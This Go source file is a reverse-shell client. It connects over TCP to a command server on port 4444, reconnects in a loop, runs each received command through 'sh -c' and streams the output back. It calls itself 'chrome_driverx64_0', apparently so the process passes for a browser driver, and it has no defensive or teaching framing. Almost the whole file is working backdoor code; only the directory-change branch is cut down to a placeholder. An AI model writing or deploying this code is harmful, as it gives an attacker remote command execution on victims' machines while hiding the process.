package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

type Client struct {
	Name       string
	ServerIP   string
	Port       int
	Connection net.Conn
	DataPath   string
	System     string
}

func NewClient(name, serverIP string, port int) *Client {
	return &Client{
		Name:     name,
		ServerIP: serverIP,
		Port:     port,
		DataPath: "data.txt",
		System:   runtime.GOOS,
	}
}

func (c *Client) Send(data string) {
	if c.Connection == nil {
		fmt.Println("Not connected to the server")
		return
	}
	_, err := c.Connection.Write([]byte(data + "\n"))
	if err != nil {
		fmt.Println("Error sending data to the server:", err)
	}
}

func (c *Client) Connect() {
	for {
		c.ConnectToServer()
		if c.Connection != nil {
			c.Send(c.Name)
			break
		}
		time.Sleep(1 * time.Second)
	}
}

func (c *Client) ConnectToServer() {
	address := fmt.Sprintf("%s:%d", c.ServerIP, c.Port)
	conn, err := net.Dial("tcp", address)
	if err != nil {
		c.Connection = nil
		return
	}
	c.Connection = conn
}

func (c *Client) HandleCommands() {
	for {
		for c.Connection == nil {
			c.Connect()
			time.Sleep(1 * time.Second)
		}

		command, err := bufio.NewReader(c.Connection).ReadString('\n')
		if err != nil {
			fmt.Println("Error reading command:", err)
			c.Connection.Close()
			c.Connection = nil
			continue
		}

		command = strings.TrimSuffix(command, "\n")

		if strings.HasPrefix(command, "cd ") {
			// ... (existing code)
		} else {
			cmd := exec.Command("sh", "-c", command)
			output, err := cmd.CombinedOutput()
			if err != nil {
				fmt.Println("Error executing command:", err)
				fmt.Fprintln(c.Connection, "Error executing command:", err)
			} else {
				outputLines := strings.Split(string(output), "\n")
				for _, line := range outputLines {
					fmt.Println(line)
					fmt.Fprintln(c.Connection, line) // Send output back to the server
				}
				fmt.Fprintln(c.Connection, "END_OF_RESPONSE") // Signal the end of output
			}
		}
		time.Sleep(1 * time.Second)
	}
}

func main() {
	name := "chrome_driverx64_0"
	serverIP := "127.0.0.1"
	port := 4444

	client := NewClient(name, serverIP, port)
	go client.Connect()
	go client.HandleCommands()

	// Keep the main process running
	select {}
}
